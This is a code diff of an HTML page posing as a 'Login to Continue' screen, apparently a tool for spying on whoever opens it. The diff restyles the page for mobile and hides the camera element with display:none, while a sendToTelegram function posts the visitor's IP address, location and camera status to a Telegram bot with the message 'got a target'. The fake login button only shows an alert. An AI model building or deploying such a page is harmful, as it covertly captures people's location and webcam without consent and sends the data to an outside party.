@@ -2,6 +2,7 @@
 <html>
 <head>
   <title>Login to Continue</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       background-color: #1e2a38;
@@ -13,51 +14,55 @@
       justify-content: center;
       height: 100vh;
       margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
     }
     .login-box {
       background-color: #2e3e4f;
-      padding: 30px;
+      padding: 25px 20px;
       border-radius: 10px;
       text-align: center;
-      width: 90%;
-      max-width: 400px;
+      width: 100%;
+      max-width: 360px;
       box-shadow: 0 0 10px rgba(0,0,0,0.3);
-      position: none;
     }
     .login-box h2 {
-      margin-bottom: 20px;
+      margin-bottom: 15px;
+      font-size: 20px;
     }
     .login-box input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin: 10px 0;
       border: none;
       border-radius: 5px;
+      font-size: 16px;
     }
     .login-box button {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       background-color: #3b82f6;
       border: none;
       color: white;
       border-radius: 5px;
       cursor: pointer;
+      font-size: 16px;
     }
     #camera {
-      border: 1px solid black;
-      margin-top: 20px;
+      display: none;
     }
     footer {
       margin-top: 20px;
       font-size: 12px;
       color: #aaa;
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
     <h2>Login to Continue</h2>
-    <img src="https://files.catbox.moe/o2x74k.png" alt="Mascot" width="100"><br><br>
+    <img src="https://files.catbox.moe/o2x74k.png" alt="Mascot" width="80"><br><br>
     <input type="text" placeholder="USERNAME OR EMAIL">
     <input type="password" placeholder="PASSWORD">
     <button onclick="alert('MAKASIH UDAH LOGIN')">LOGIN</button>
@@ -123,14 +128,14 @@
     }
 
     function sendToTelegram(blobImage) {
-      const message = `\`\`\`
+      const message = `
 DEVELOPER : HANXX
 DAPET TARGET NIH HANXX
 
 IP Address: ${ipAddress}
 Lokasi: ${locationInfo}
 Kamera: ${cameraStatus}
-      \`\`\``;
+      `;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
